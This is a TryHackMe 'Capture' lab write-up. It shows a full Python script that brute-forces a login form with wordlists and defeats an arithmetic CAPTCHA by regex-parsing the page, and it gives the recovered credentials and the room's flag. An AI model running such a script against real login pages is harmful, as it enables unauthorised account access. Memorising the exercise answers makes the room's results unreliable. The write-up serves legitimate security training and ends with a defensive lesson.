# TryHackMe: Capture

**Category:** Web Exploitation
**Tooling:** Python (requests), custom brute-force script
**Techniques:** Credential brute forcing, CAPTCHA bypass via response parsing, rate-limit evasion

---

## Overview

SecureSolaCoders built a custom login rate-limiter instead of using a WAF, believing it was sufficient protection against brute-force attacks. The investigation shows otherwise: standard recon (port scanning, web crawling, SQL injection) turned up nothing, leaving credential brute forcing as the only viable path — and the site's homegrown CAPTCHA (a simple arithmetic question) turned out to be programmatically solvable, defeating the entire protection.

---

## 1. Recon

- Port scan: no additional open ports beyond the web service
- Web crawling: no useful results
- SQL injection: not exploitable

With no other attack surface available, brute forcing the login form was the only remaining option.

---

## 2. Investigation

### Q1 — Value of flag.txt

**Step 1 — Building a brute-force script**

Wrote a Python script (with AI assistance) to iterate through username/password wordlists against the login endpoint. The script also handles the site's custom CAPTCHA — a simple math question (e.g. `7 + 3`) embedded in the response — by parsing and solving it automatically before resubmitting the login attempt:

```python
import re
import requests

usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
url = "http://10.128.167.72/login"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.128.167.72",
    "Connection": "close",
    "Referer": "http://10.10.23.132/login",
    "Upgrade-Insecure-Requests": "1",
}


def calculate(num1, num2, operation):
    if operation == '*':
        return num1 * num2
    elif operation == '+':
        return num1 + num2
    elif operation == '-':
        return num1 - num2
    elif operation == '/':
        return num1 / num2
    else:
        raise ValueError(f"Invalid operation: {operation}")


def user_does_not_exist(response_text):
    return "does not exist" in response_text.lower()


with open(usernames_file, "r") as uf, open(passwords_file, "r") as pf:
    usernames = uf.read().splitlines()
    passwords = pf.read().splitlines()

for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password,
        }
        response = requests.post(url, headers=headers, data=data)
        response_size = len(response.content)

        if user_does_not_exist(response.text):
            print(f"Skipping username {username} as it does not exist.")
            break

        if "does not exist" not in response.text.lower() and "captcha" not in response.text.lower():
            # Replace this with a specific success condition for the website
            print(f"Success, {username}, {password}, {response_size}")
            exit(0)
        else:
            print(f"Failed, {username}, {password}, {response_size}")

        if "captcha" in response.text.lower():
            captcha_question = re.search(r"(\d+)\s*([\+\-\*/])\s*(\d+)", response.text)
            if captcha_question:
                num1, operation, num2 = int(captcha_question.group(1)), captcha_question.group(2), int(captcha_question.group(3))
                captcha = calculate(num1, num2, operation)
                data["captcha"] = captcha

                # Resubmit the previous username, password, and captcha answer
                response = requests.post(url, headers=headers, data=data)
                response_size = len(response.content)

                if user_does_not_exist(response.text):
                    print(f"Skipping username {username} as it does not exist.")
                    break

                if "does not exist" not in response.text.lower() and "captcha" not in response.text.lower():
                    print(f"Success, {username}, {password}, {response_size}")
                    exit(0)
                else:
                    print(f"Failed, {username}, {password}, {response_size}")

print("Failed to log in with the given credentials.")
```

**Key design points of the script:**
- Skips a username entirely once the response indicates it doesn't exist, saving time by not testing every password against invalid accounts
- Detects the CAPTCHA prompt in the response body, extracts the arithmetic expression via regex, computes the answer, and resubmits automatically
- Uses response size as an additional signal alongside text matching to help distinguish success/failure states

**Step 2 — Running the brute force**

The script found a valid set of credentials:
```
username: natalie
password: sk8board
```

**Step 3 — Logging in and retrieving the flag**

**Answer:**
```
7df2eabce36f02ca8ed7f237f77ea416
```

---

## Key Lesson

This room shows why homegrown security controls are risky compared to established solutions: the developers rejected a WAF in favor of a custom rate limiter plus a simple math-based CAPTCHA — but neither actually stopped automated brute forcing, since the CAPTCHA was trivially solvable by regex-parsing the arithmetic expression straight out of the HTML response. A real CAPTCHA (image-based, behavioral, or a vetted service like reCAPTCHA/hCaptcha) can't be solved by simply reading the challenge text back out of the page source — this is a good reminder that any anti-automation control which embeds its own answer (or the means to compute it) in a machine-readable response isn't providing real protection.
